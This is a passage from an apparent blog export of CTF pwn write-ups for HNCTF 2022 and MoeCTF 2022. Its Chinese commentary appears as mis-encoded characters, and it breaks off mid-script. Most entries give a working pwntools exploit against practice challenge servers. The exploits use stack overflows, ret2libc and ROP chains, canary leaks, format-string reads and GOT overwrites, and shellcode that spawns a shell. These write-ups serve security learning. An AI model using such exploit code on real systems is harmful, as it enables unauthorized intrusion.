<h1><span id="exp">exp ï¼š</span></h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28441</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">rdi_addr = <span class="number">0x401323</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;%51$p.%53$p&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;name:\n&#x27;</span>, payload)</span><br><span class="line"> </span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x29d90</span></span><br><span class="line"> </span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x110</span> - <span class="number">8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(system)</span><br><span class="line"> </span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>HNCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>[HNCTF 2022 Week1] PWN å¤ç°</title>
    <url>/%5BHNCTF%202022%20Week1%5D%20PWN%20%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>[HNCTF 2022 Week1] PWN å¤ç°</p>
<span id="more"></span>

<h2><span id="easync">easync</span></h2><p>ç­¾åˆ°é¢˜ï¼Œç›´æ¥ <code>nc</code> å°±è¡Œï¼Œä½†æ˜¯è¿™é‡Œæœ‰å‘éœ€è¦æ³¨æ„ä¸‹ï¼Œç›´æ¥ <code>cat flag</code>ï¼Œå¾—åˆ°çš„æ˜¯ä¸€ä¸ªå‡çš„ flagï¼ŒçœŸçš„ flag åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œè¿™ç‚¹éœ€è¦æ³¨æ„ä¸‹ã€‚</p>
<hr>
<h2><span id="easyoverflow">easyoverflow</span></h2><p>ç®€å•çš„æ ˆæº¢å‡ºï¼Œç›´æ¥æº¢å‡ºå°±è¡Œï¼Œexp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>,<span class="number">28487</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input something\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span> +<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="ezcmp">ezcmp</span></h2><p>åˆ†æä¸€ä¸‹ä»£ç ï¼Œå‘ç° <code>buff</code> è¢«åŠ å¯†äº†ï¼Œåªéœ€ç»•è¿‡è¿™ä¸ª <code>if</code> è¯­å¥ï¼Œå°±å¯ä»¥æ‰§è¡Œ <code>binsh</code> äº†ï¼Œé—®é¢˜æ˜¯æ€ä¹ˆç»•è¿‡å‘¢ï¼Ÿgdb è°ƒè¯•æ¥å‘Šè¯‰ä½ ã€‚</p>
<p><img src="/images/%5BHNCTF2022Week1%5DPWN%E5%A4%8D%E7%8E%B0/1.png"></p>
<p> æ‰“æ–­ç‚¹ï¼Œåˆ°enccrypt,é€šè¿‡è°ƒè¯•å¯ä»¥å‘ç°è¢«åŠ å¯†buffçš„åœ°å€ï¼Œåœ¨è§‚å¯Ÿå…¶å†…å®¹ï¼Œå°±å¯ä»¥è§£å†³é—®é¢˜äº†ï¼Œexpå¦‚ä¸‹ï¼š</p>
<p><img src="/images/%5BHNCTF2022Week1%5DPWN%E5%A4%8D%E7%8E%B0/2.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>,<span class="number">28776</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x144678aadc0e4072</span>) + p64(<span class="number">0x84b6e81a4c7eb0e2</span>) + p64(<span class="number">0xf426588abcee2052</span>) + p64(<span class="number">0x0000c8cb2c5e90c2</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="ezr0p32">ezr0p32</span></h2><p>é¦–å…ˆåˆ†æä¸€ä¸‹ä»£ç ï¼Œå¯çŸ¥å‡ºç°äº†ä¸¤ä¸ª <code>buf</code>ï¼Œä½†æ˜¯è¿™ä¸¤ä¸ª <code>buf</code> çš„ä½œç”¨æ˜¯ä¸åŒçš„ã€‚ç¬¬ä¸€ä¸ª <code>buf</code> åœ¨ <code>.bss</code> æ®µï¼Œè¿™æ ·å°±å¯ä»¥æŠŠ <code>/bin/sh</code> å†™è¿› <code>buf</code> é‡Œé¢ï¼Œç„¶åæ‰§è¡Œ <code>system(&quot;/bin/sh&quot;)</code> è·å¾— flagã€‚</p>
<p><img src="/images/%5BHNCTF2022Week1%5DPWN%E5%A4%8D%E7%8E%B0/3.png"></p>
<p><img src="/images/%5BHNCTF2022Week1%5DPWN%E5%A4%8D%E7%8E%B0/4.png"></p>
<p>è¿™é‡Œä¹Ÿéœ€è¦æ³¨æ„32ä½ç¨‹åºå’Œ64ä½ç¨‹åºçš„ä¼ å‚è§„åˆ™ï¼Œæ­¤é¢˜ä½32ä½ç¨‹åºï¼Œæ˜¯é€šè¿‡æ ˆä¼ é€’ï¼Œæ‰€ä»¥payloadçš„æ ¼å¼æœ‰æ‰€ä¸åŒï¼Œsystem + åƒåœ¾æ•°æ® + binshï¼Œè¿™äº›éœ€è¦è‡ªå·±å»åšé¢˜æ€»ç»“å‘ç°ï¼Œexpå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>,<span class="number">28224</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">buf=<span class="number">0x804A080</span></span><br><span class="line">system=<span class="number">0x80483D0</span></span><br><span class="line"><span class="comment">#system=elf.plt[&#x27;system&#x27;]</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;please tell me your name&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;now it&#x27;s your play time~&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x1c</span>+<span class="number">0x4</span>) +p32(system) +p32(<span class="number">0</span>) +p32(buf)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="ezr0p64">ezr0p64</span></h2><p>åˆ†æå¯çŸ¥ç»™å‡ºäº† <code>puts</code> åœ°å€ï¼Œå¯ä»¥æ®æ­¤æ¨ç®— libc åŸºå€ï¼Œæ„é€  <code>system</code> å’Œ <code>/bin/sh</code>ï¼Œå¥—è·¯æ¯”è¾ƒæ˜æ˜¾ï¼Œç›´æ¥ä¸Šexp</p>
<p><img src="/images/%5BHNCTF2022Week1%5DPWN%E5%A4%8D%E7%8E%B0/5.png"></p>
<p> è‡³äºpayloadçš„æ„é€ æ ¼å¼ï¼Œå°±è¦äº†è§£64ä½ç¨‹åºçš„ä¼ å‚æ–¹å¼ï¼Œå‰å…­ä¸ªå‚æ•°æ˜¯é€šè¿‡rdi, rsi, rdx, rcx, r8, r9, è¿™å…­ä¸ªå¯„å­˜å™¨ï¼Œåç»­çš„å‚æ•°é€šè¿‡æ ˆä¼ é€’ï¼Œè®°ä½æ ¼å¼å°±è¡Œ</p>
<p>EXP å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>,<span class="number">28942</span>)</span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="number">0x4012a3</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">vuln = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base +  <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span> +<span class="number">8</span>) +p64(ret_addr) +p64(rdi_addr) +p64(binsh) +p64(system)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;Start your rop.&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="fmtstrre">fmtstrre</span></h2><p>æ˜æ˜¾å­˜åœ¨æ ¼å¼å­—ç¬¦ä¸²æ¼æ´</p>
<p><img src="/images/%5BHNCTF2022Week1%5DPWN%E5%A4%8D%E7%8E%B0/6.png"></p>
<p>å¹¶å‘ç°åç§»ä¸º 6</p>
<p><img src="/images/%5BHNCTF2022Week1%5DPWN%E5%A4%8D%E7%8E%B0/7.png"></p>
<p>gdb è°ƒè¯•ï¼Œå¹¶æ³¨æ„ <code>.bss</code> æ®µ <code>name</code> åœ°å€ï¼ˆå­˜å‚¨äº† flagï¼‰ï¼Œ0x20 +6&#x3D;38ï¼Œä»è€ŒçŸ¥é“flagçš„ä½ç½®</p>
<p><img src="/images/%5BHNCTF2022Week1%5DPWN%E5%A4%8D%E7%8E%B0/8.png"></p>
<blockquote>
<p>%x ä»¥åå…­è¿›åˆ¶æ‰“å°ï¼Œåªèƒ½æ‰“å°4å­—èŠ‚ï¼Œä¸€èˆ¬åªç”¨äº32ä½</p>
<p>%p æ‰“å°ç›®æ ‡åœ°å€ï¼Œå»ºè®®32ä½å’Œ64ä½éƒ½ç”¨è¿™ä¸ª</p>
<p>%s æ‰“å°åœ°å€å†…å®¹ %c æ‰“å°å•ä¸ªå­—ç¬¦</p>
<p>%hhn å†™ä¸€å­—èŠ‚ %hn å†™ä¸¤å­—èŠ‚</p>
<p>%n å†™å››å­—èŠ‚</p>
<p>%ln 32ä½å†™å››å­—èŠ‚ï¼Œ64ä½å†™å…«å­—èŠ‚</p>
<p>%lln å†™å…«å­—èŠ‚</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#p=process(&#x27;./111&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>,<span class="number">28036</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input your format string.\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%38$s&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="ret2shellcode">ret2shellcode</span></h2><p>ç»å…¸çš„ shellcode æ³¨å…¥é¢˜ï¼Œå°† shellcode å†™å…¥ <code>.bss</code> æ®µï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span>,<span class="number">28928</span>)</span><br><span class="line"></span><br><span class="line">payload=asm(shellcraft.sh())</span><br><span class="line">buff=<span class="number">0x4040A0</span></span><br><span class="line"></span><br><span class="line">payload=payload.ljust(<span class="number">0x108</span>,<span class="string">b&#x27;A&#x27;</span>)+p64(buff)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="safe_shellcode">safe_shellcode</span></h2><p>è¿™é“é¢˜å°±éš¾åº¦ï¼Œä¸å¤ªä¼šï¼Œä»¥åä¼šäº†ï¼Œå†æ¥æ”¹ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28840</span>)</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode_64=<span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span></span><br><span class="line">payload=shellcode_64</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>HNCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>[MoeCTF 2022] PWNå¤ç°</title>
    <url>/%5BMoeCTF%202022%5D%20PWN%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>[MoeCTF 2022] PWNå¤ç°</p>
<span id="more"></span>

<h2><span id="ret2text">ret2text</span></h2><p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/1.png"></p>
<p>å‘ç”Ÿäº†æ˜æ˜¾çš„æº¢å‡ºï¼Œå¹¶ä¸”ä¹Ÿå‘ç°äº†æœ‰åé¢å‡½æ•°ï¼Œå¯ä»¥ç›´æ¥æº¢å‡ºï¼Œexp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span>, <span class="number">28287</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x4014BA</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x40</span> + <span class="number">8</span>) + p64(ret) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2><span id="ret2libc">ret2libc</span></h2><p>å¾ˆä¼ ç»Ÿçš„ç»å…¸é¢˜å‹ï¼Œåˆ©ç”¨putsæ³„éœ²libc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>, <span class="number">28546</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x4011A8</span></span><br><span class="line">rdi_addr = <span class="number">0x40117e</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x40</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr:&#x27;</span>, <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x40</span> + <span class="number">8</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2><span id="rop32">rop32</span></h2><p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/2.png"></p>
<p> å› ä¸ºè¿™é‡Œå¯ä»¥ç›´æ¥call system,å¹¶ä¸”è¿˜æœ‰binsh,ç›´æ¥æ„é€ å°±å®Œäº‹äº†ï¼Œexpå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>, <span class="number">28903</span>)</span><br><span class="line"></span><br><span class="line">bin_addr = <span class="number">0x804C024</span></span><br><span class="line">sys_addr = <span class="number">0x80491E7</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x1c</span> + <span class="number">4</span>) + p32(sys_addr) + p32(bin_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2><span id="rop64">rop64</span></h2><p>å› ä¸ºä¿æŠ¤æœºåˆ¶å¼€å¯äº†canaryï¼Œæ‰€ä»¥é¦–å…ˆè¦ç»•è¿‡ï¼Œæ‰å¥½å¼€å±•åç»­å·¥ä½œ</p>
<p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/3.png"></p>
<p> è¿™é‡Œå¯ä»¥ç›´æ¥æ³„éœ²canaryçš„åœ°å€ï¼Œå¹¶ä¸”canary &#x3D;0x28,åç»­å°±æ˜¯ç»å…¸çš„å¥—è·¯äº† </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node1.anna.nssctf.cn&quot;</span>, <span class="number">28912</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x29</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;Go Go Go!!!\n&quot;</span>, payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x29</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="number">0x4011de</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">system = <span class="number">0x401284</span></span><br><span class="line">binsh = <span class="number">0x404058</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(rdi_addr) + p64(binsh) + p64(system)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2><span id="filedes">filedes</span></h2><p>è¿™é¢˜çš„çŸ¥è¯†ç‚¹æ¯”è¾ƒåå§ï¼Œæ–‡ä»¶çš„æ ‡å‡†è¾“å‡ºæµ</p>
<p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/4.png"></p>
<p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/5.png"></p>
<h2><span id="endian">endian</span></h2><p>è¿™é¢˜å› ä¸º<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E6%B1%87%E7%BC%96&spm=1001.2101.3001.7020">åæ±‡ç¼–</a>é‡Œé¢è¯´äº†éœ€è¦è¾“å…¥ä¸¤ä¸ªæ•´æ•°ï¼Œå†åŠ ä¸Šå°ç«¯åºçš„ç¼˜æ•…ï¼Œæ‰€ä»¥è¦å€’è¿‡æ¥ï¼Œexpå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>, <span class="number">28598</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x616b694d</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line">payload = <span class="number">0x424e6f74</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2><span id="border">border</span></h2><p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/6.png"></p>
<p> å†åŠ ä¸Šï¼Œè¦è¾“å‡ºæº¢å‡ºçš„é•¿åº¦ï¼Œæ±‚å‡ºä¸¤é—´çš„è·ç¦»</p>
<p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/7.png"></p>
<p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/8.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;1.14.71.254&#x27;</span>, <span class="number">28780</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;length:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;32&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&quot;a&quot;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2><span id="buffer-overflow">buffer overflow</span></h2><p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/9.png"></p>
<p> éœ€è¦ç‚¹é€†å‘çš„èƒ½åŠ›ï¼Œçœ‹ä»£ç ï¼Œå¯çŸ¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>, <span class="number">28309</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Write down your note:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">70</span> + <span class="string">b&#x27;Limiter and Wings are beautiful girls!\x00&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2><span id="babyfmt">babyfmt</span></h2><p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/10.png"></p>
<p> å·²ç»å‘Šè¯‰äº†åé¢å‡½æ•°ï¼Œä½†æ˜¯å‘ç”Ÿäº†æ ¼å¼<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">å­—ç¬¦ä¸²</a>æ¼æ´ï¼Œå¯ä»¥é€šè¿‡è¿è¡Œç¨‹åºæ‰¾åˆ°åç§»ï¼Œexpå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span>, <span class="number">28931</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;%10$s&quot;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="built_in">int</span>(p.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">11</span>, &#123;printf_got: backdoor&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2><span id="random">random</span></h2><p>è¿™é¢˜å°±æ˜¯éšæœºæ•°ï¼Œæ—¶é—´åšç§å­ï¼Œæ¥è§£å†³ï¼Œè¿™é‡Œæˆ‘æœ‰ç‚¹ä¸æ˜ç™½æ¥æ”¶ä¸€ä¸‹ b&#39;a&#39;*0x20ï¼Œæ²¡æœ‰çœ‹æ˜ç™½</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node2.anna.nssctf.cn&quot;</span>, <span class="number">28497</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">p.sendafter(<span class="string">&quot;username: &quot;</span>, payload)</span><br><span class="line">payload = <span class="string">b&#x27;ls_4nyth1n9_7ruIy_R4nd0m?\x00&#x27;</span></span><br><span 